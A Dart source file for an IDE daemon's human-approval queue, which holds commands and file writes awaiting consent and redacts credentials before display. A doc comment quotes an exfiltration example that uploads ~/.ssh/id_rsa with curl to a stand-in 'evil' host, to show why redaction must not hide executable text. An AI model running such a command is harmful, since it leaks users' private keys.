/// Interactive consent queue (D5, `docs/architecture/015-desktop-ide.md`): holds operations
/// [command_policy.dart]'s `evaluateCommand`/`evaluateWrite` returned `needsApproval` for, until a
/// human answers through the Desktop IDE's approval UI (or the request times out). Originally
/// command-only (D5); generalized in D6 to also cover file writes (`OperationKind.write`), since a
/// write needing interactive consent is the same "queue it, wait, revalidate before acting" shape
/// as a command, just with a diff instead of a command string as the thing a human reviews.
///
/// A [PendingApproval] binds itself to the exact operation it was requested for via
/// [PendingApproval.operationHash] -- [TaskHandler.run]/[TaskHandler.writeFile] re-derive that same
/// hash from the current call context immediately before acting on an approved operation and
/// refuse to proceed on a mismatch, so a decision made after however long a human takes to respond
/// is checked against the state of the world at execution time, not just trusted by id. See
/// ADR-011 for why this daemon (not the server) is where consent lives at all.
///
/// Identity is anchored on [PendingApproval.rootPath], not a "workspace id" -- this daemon has no
/// such concept anywhere (grant/revoke/trust all key on the granted root's canonical path; see
/// `containment.dart`). This matches `terminal_session_manager.dart`'s existing precedent
/// (`handleConnection({required String rootPath})`): the client, not the daemon, maps a root path
/// to its own `workspaceId` for `IdeEvent` purposes.
library;

import 'dart:async';
import 'dart:convert';

import 'package:crypto/crypto.dart';

import 'error_codes.dart';

enum ApprovalStatus { pending, approved, rejected, expired, cancelled }

/// What kind of operation a [PendingApproval] represents -- determines which fields are populated
/// and how the approval UI renders it (a command string vs. a diff).
enum OperationKind { command, write }

/// One file this approval would write if approved -- [finalContent] is already fully resolved
/// (a find/replace op's replacement already applied), since [PendingApproval.operationHash] and
/// the eventual write both need the exact bytes that will land on disk, not the edit instructions
/// that produced them.
class WriteOp {
  const WriteOp({required this.path, required this.finalContent});
  final String path;
  final String finalContent;
}

/// How long a pending approval waits for a human before resolving itself to [ApprovalStatus.expired].
/// A starting value, not load-bearing -- easy to tune once real usage shows whether 5 minutes
/// feels too short (a human away from the keyboard) or too long (an agent stalled needlessly).
const approvalTimeout = Duration(minutes: 5);

/// G-21 (WP9): how many approvals may wait for a human at once. Beyond it a new request is
/// refused ([ApprovalQueueFullError]) rather than queued -- nobody reviews a hundred pending
/// changes, and each pending write holds its full new content in memory.
const maxPendingApprovals = 100;

/// G-21: how many decided approval ids the queue remembers (id and outcome only, never the
/// operation), so a late or duplicate answer stays a harmless no-op rather than a 404.
const rememberedApprovalDecisions = 1000;

/// G-21: a new approval was refused because [ApprovalQueue.maxPending] are already waiting.
class ApprovalQueueFullError implements Exception {
  ApprovalQueueFullError();
  final String message = 'Too many changes are waiting for your approval; answer some first.';
  final String code = HostdErrorCode.approvalQueueFull;
  @override
  String toString() => message;
}

class PendingApproval {
  PendingApproval._({
    required this.id,
    required this.kind,
    this.canonicalCommand,
    this.displayCommand,
    this.writeOperations,
    this.diffPreview,
    required this.cwd,
    required this.rootPath,
    required this.requestedAt,
    Duration timeout = approvalTimeout,
  })  : expiresAt = requestedAt.add(timeout),
        operationHash = kind == OperationKind.command
            ? PendingApproval.hashForCommand(command: canonicalCommand!, cwd: cwd, rootPath: rootPath)
            : PendingApproval.hashForWrite(operations: writeOperations!, cwd: cwd, rootPath: rootPath);

  factory PendingApproval.command({
    required String id,
    required String canonicalCommand,
    required String displayCommand,
    required String cwd,
    required String rootPath,
    required DateTime requestedAt,
    Duration timeout = approvalTimeout,
  }) =>
      PendingApproval._(
        id: id,
        kind: OperationKind.command,
        canonicalCommand: canonicalCommand,
        displayCommand: displayCommand,
        cwd: cwd,
        rootPath: rootPath,
        requestedAt: requestedAt,
        timeout: timeout,
      );

  factory PendingApproval.write({
    required String id,
    required List<WriteOp> operations,
    required String diffPreview,
    required String cwd,
    required String rootPath,
    required DateTime requestedAt,
    Duration timeout = approvalTimeout,
  }) =>
      PendingApproval._(
        id: id,
        kind: OperationKind.write,
        writeOperations: operations,
        diffPreview: diffPreview,
        cwd: cwd,
        rootPath: rootPath,
        requestedAt: requestedAt,
        timeout: timeout,
      );

  final String id;
  final OperationKind kind;

  /// The real command that will execute on approval -- never sent to the client. Only set when
  /// [kind] is [OperationKind.command]. See [displayCommand].
  final String? canonicalCommand;

  /// A redacted-for-display copy of [canonicalCommand] -- what the approval UI actually shows a
  /// human, so an incidental credential in the command text isn't surfaced verbatim. Execution
  /// always uses [canonicalCommand]; this field exists purely for the `GET /approvals` response.
  final String? displayCommand;

  /// The files this approval would write, with fully-resolved final content -- only set when
  /// [kind] is [OperationKind.write].
  final List<WriteOp>? writeOperations;

  /// A redacted unified diff of [writeOperations] against their current on-disk content -- what
  /// the approval UI shows a human for a write, mirroring [displayCommand]'s role for a command.
  /// Only set when [kind] is [OperationKind.write].
  final String? diffPreview;

  final String cwd;
  final String rootPath;
  final DateTime requestedAt;
  final DateTime expiresAt;

  /// Binds this approval to the exact operation/cwd/root it was requested for -- computed once at
  /// creation. [TaskHandler.run]/[TaskHandler.writeFile] recompute this same hash from the current
  /// call context right before acting and refuse to proceed on a mismatch (root revoked, target
  /// file changed on disk, or any other change between request and approval). Renamed from D5's
  /// `commandHash`: the concept was already "the operation this approval is for," just command-only
  /// until D6 added a second kind.
  final String operationHash;

  ApprovalStatus status = ApprovalStatus.pending;

  final Completer<ApprovalStatus> _decision = Completer<ApprovalStatus>();

  /// Resolves once a human responds, this approval expires, or it is cancelled -- never resolves
  /// to [ApprovalStatus.pending].
  Future<ApprovalStatus> get decision => _decision.future;

  Map<String, Object?> toJson() => {
        'id': id,
        'kind': kind.name,
        'command': kind == OperationKind.command ? displayCommand : null,
        'diff_preview': kind == OperationKind.write ? diffPreview : null,
        'paths': kind == OperationKind.write ? writeOperations!.map((o) => o.path).toList() : null,
        'cwd': cwd,
        'root': rootPath,
        'requested_at': requestedAt.toIso8601String(),
        'expires_at': expiresAt.toIso8601String(),
        'status': status.name,
      };

  /// Public so [TaskHandler.run] can recompute the same hash from the current call context right
  /// before executing an approved command, and compare it against [operationHash] (D5 plan design
  /// decision 5: revalidate, don't just trust the id).
  static String hashForCommand({required String command, required String cwd, required String rootPath}) {
    final bytes = utf8.encode('$command|$cwd|$rootPath');
    return sha256.convert(bytes).toString();
  }

  /// Public so [TaskHandler.writeFile]/`writeFiles` can recompute the same hash from current disk
  /// state right before writing an approved operation, and compare it against [operationHash] (D6
  /// plan section C.3: a write has an extra staleness risk a command doesn't -- the target file(s)
  /// can themselves have changed between request and approval, not just the root/trust -- so this
  /// must be re-derived from *current* file content, not merely re-checked against the root).
  /// Hashes content digests rather than raw content so a large write's approval object stays small
  /// and this recomputation stays cheap even for many/large files.
  static String hashForWrite({
    required List<WriteOp> operations,
    required String cwd,
    required String rootPath,
  }) {
    final perFile = operations
        .map((o) => '${o.path}|${sha256.convert(utf8.encode(o.finalContent)).toString().substring(0, 16)}')
        .join(';');
    final bytes = utf8.encode('$perFile|$cwd|$rootPath');
    return sha256.convert(bytes).toString();
  }
}

/// Redacts common credential-shaped substrings from a command string before it is ever shown to a
/// human -- best-effort only, not a security boundary (the real command still executes with real
/// secrets; see [PendingApproval.displayCommand]'s doc comment). Matches the spirit of
/// `task_handler.dart::_effectiveShellCommand`'s existing string handling without touching that
/// function.
///
/// What it hides must never include anything that runs (F17): the person approves the text they
/// see. A value ends at whitespace or at any character the shell gives meaning to -- `;`, `&`,
/// `|`, `$`, backtick, `<`, `>`, parentheses, braces, quotes, a backslash, a glob -- so
/// `token=x;curl${IFS}-T${IFS}~/.ssh/id_rsa${IFS}http://evil` shows as
/// `token=[REDACTED];curl${IFS}-T...`. A value starting with `-` or `~` is left alone: it is an
/// option or a home path given as the next word, not a secret. A quoted value is hidden only when
/// the quotes hold none of those characters and no whitespace: substitution runs inside double
/// quotes, and a quote this regex takes for an opening one may really close an earlier string,
/// turning what looks like a quoted value into whole arguments (`'token=' -T ~/.ssh/id_rsa ''`).
/// A secret this leaves visible is the lesser failure.
String redactForDisplay(String command) {
  var result = command;
  result = result.replaceAllMapped(
    RegExp('(Bearer)\\s+$_redactableValue', caseSensitive: false),
    (m) => '${m[1]} [REDACTED]',
  );
  result = result.replaceAllMapped(
    RegExp('(Authorization\\s*[:=]\\s*(?:(?:Basic|Bearer|Token|Digest)\\s+)?)$_redactableValue',
        caseSensitive: false),
    (m) => '${m[1]}[REDACTED]',
  );
  result = result.replaceAllMapped(
    RegExp(
      '((?:api[_-]?key|token|password|secret)\\s*[:=]\\s*)'
      '("$_plainValueChar*"|\'$_plainValueChar*\'|$_redactableValue)',
      caseSensitive: false,
    ),
    (m) => '${m[1]}[REDACTED]',
  );
  return result;
}

/// One character a redacted value may contain: anything but whitespace, a quote, and what the
/// shell would interpret ([redactForDisplay]'s doc).
const String _plainValueChar = r'''[^\s;&|`$<>(){}'"\\*?]''';

/// An unquoted value [redactForDisplay] hides: plain characters, not starting an option or a
/// home path.
const String _redactableValue = '(?![-~])$_plainValueChar+';

/// Same best-effort credential redaction as [redactForDisplay], applied line-by-line to a unified
/// diff's `+`/context lines before it's ever displayed or persisted in a [PendingApproval] (D6
/// plan decision 6) -- a file diff is at least as likely as a shell command to carry a secret
/// verbatim (an edited `.env`, a hardcoded credential a developer just typed in).
String redactDiffForDisplay(String diffText) {
  return diffText.split('\n').map(redactForDisplay).join('\n');
}

/// G-21 (WP9): the queue holds an approval -- a write's with its full new content -- only while
/// it is pending. Once it is approved, rejected, expired or cancelled it is dropped, and only its
/// id and outcome are remembered (the last [rememberedDecisions] of them) so [respond] and
/// [cancel] stay idempotent. At most [maxPending] may wait at once. The waiting call still holds
/// its own [PendingApproval] until it returns, which is all it needs.
class ApprovalQueue {
  ApprovalQueue({
    this.maxPending = maxPendingApprovals,
    this.timeout = approvalTimeout,
    this.rememberedDecisions = rememberedApprovalDecisions,
  });

  /// How many approvals may be pending at once; see [maxPendingApprovals].
  final int maxPending;

  /// How long a pending approval waits for a human; see [approvalTimeout].
  final Duration timeout;

  /// How many decided ids are remembered; see [rememberedApprovalDecisions].
  final int rememberedDecisions;

  final Map<String, PendingApproval> _pending = {};

  /// Decided ids and their outcome, oldest first (a [Map] literal keeps insertion order).
  final Map<String, ApprovalStatus> _decided = {};

  var _sequence = 0;

  /// How many approvals this queue holds in memory -- only pending ones (G-21).
  int get heldCount => _pending.length;

  /// Creates and registers a new pending command approval. [displayCommand] is derived via
  /// [redactForDisplay] here, once, rather than at read time. Throws [ApprovalQueueFullError]
  /// when [maxPending] are already waiting.
  PendingApproval createForCommand({
    required String canonicalCommand,
    required String cwd,
    required String rootPath,
  }) {
    _requireRoom();
    final approval = PendingApproval.command(
      id: _nextId(),
      canonicalCommand: canonicalCommand,
      displayCommand: redactForDisplay(canonicalCommand),
      cwd: cwd,
      rootPath: rootPath,
      requestedAt: DateTime.now(),
      timeout: timeout,
    );
    _pending[approval.id] = approval;
    return approval;
  }

  /// Creates and registers a new pending write approval. [diffText] is redacted via
  /// [redactDiffForDisplay] here, once, rather than at read time -- [operations] themselves are
  /// never redacted (they hold the exact bytes that will be written on approval). Throws
  /// [ApprovalQueueFullError] when [maxPending] are already waiting.
  PendingApproval createForWrite({
    required List<WriteOp> operations,
    required String diffText,
    required String cwd,
    required String rootPath,
  }) {
    _requireRoom();
    final approval = PendingApproval.write(
      id: _nextId(),
      operations: operations,
      diffPreview: redactDiffForDisplay(diffText),
      cwd: cwd,
      rootPath: rootPath,
      requestedAt: DateTime.now(),
      timeout: timeout,
    );
    _pending[approval.id] = approval;
    return approval;
  }

  void _requireRoom() {
    if (_pending.length >= maxPending) throw ApprovalQueueFullError();
  }

  /// A per-queue sequence number makes an id unique however approvals come and go.
  String _nextId() => 'appr_${DateTime.now().microsecondsSinceEpoch}_${_sequence++}';

  /// Every approval still waiting for a human. Decided ones are no longer held.
  List<PendingApproval> list() => _pending.values.toList(growable: false);

  /// Records a human's response. Idempotent: responding again to an id that has already resolved
  /// (approved, rejected, expired, or cancelled) is a no-op, not an error -- it never overwrites a
  /// prior decision. Returns `false` only when [id] is not a known approval -- never one, or
  /// decided so long ago it is no longer remembered -- so the caller can respond `404`.
  bool respond(String id, bool approved) =>
      _decide(id, approved ? ApprovalStatus.approved : ApprovalStatus.rejected);

  /// The server has given up on the call this approval belongs to (audit FSA-041): resolve it as
  /// [ApprovalStatus.cancelled] so the waiting task throws instead of executing, and so a human
  /// answering later finds it already decided ([respond] is idempotent). Returns `false` only
  /// when [id] is not a known approval; an already-decided one is left as it is.
  bool cancel(String id) => _decide(id, ApprovalStatus.cancelled);

  bool _decide(String id, ApprovalStatus status) {
    final approval = _pending[id];
    if (approval == null) return _decided.containsKey(id);
    _resolve(approval, status);
    return true;
  }

  /// Completes [approval] as [status] and stops holding it (G-21).
  void _resolve(PendingApproval approval, ApprovalStatus status) {
    if (approval.status != ApprovalStatus.pending) return;
    approval.status = status;
    approval._decision.complete(status);
    _pending.remove(approval.id);
    _decided[approval.id] = status;
    while (_decided.length > rememberedDecisions) {
      _decided.remove(_decided.keys.first);
    }
  }

  /// Waits for [approval] to be answered, or for [timeout] to elapse -- whichever comes first. On
  /// timeout, marks the approval [ApprovalStatus.expired] itself (rather than leaving it `pending`
  /// forever) so a subsequent `GET /approvals` stops listing it, the queue stops holding it, and a
  /// late human response finds it already resolved (and is safely ignored by [respond]'s
  /// idempotency).
  Future<ApprovalStatus> awaitDecision(PendingApproval approval) async {
    return approval.decision.timeout(
      approval.expiresAt.difference(approval.requestedAt),
      onTimeout: () {
        _resolve(approval, ApprovalStatus.expired);
        return approval.status;
      },
    );
  }
}
